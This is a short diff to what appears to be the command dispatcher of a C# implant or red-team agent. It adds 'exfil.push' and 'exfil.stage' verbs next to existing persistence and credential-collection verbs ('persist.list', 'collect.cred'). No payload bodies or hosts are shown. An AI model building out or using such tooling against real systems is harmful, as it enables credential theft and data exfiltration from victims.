@@ -96,6 +96,8 @@ internal sealed class Runner
             "persist.list" => WithNoChunks(Persist.List(arguments)),
             "collect.file" => Collect.File(arguments),
             "collect.cred" => Collect.Cred(arguments),
+            "exfil.push" => Exfil.Push(arguments),
+            "exfil.stage" => Exfil.Stage(arguments),
             _ => (TaskOutcome.Failed, "unknown verb: " + verb, Array.Empty<ExfilChunk>()),
         };
     }
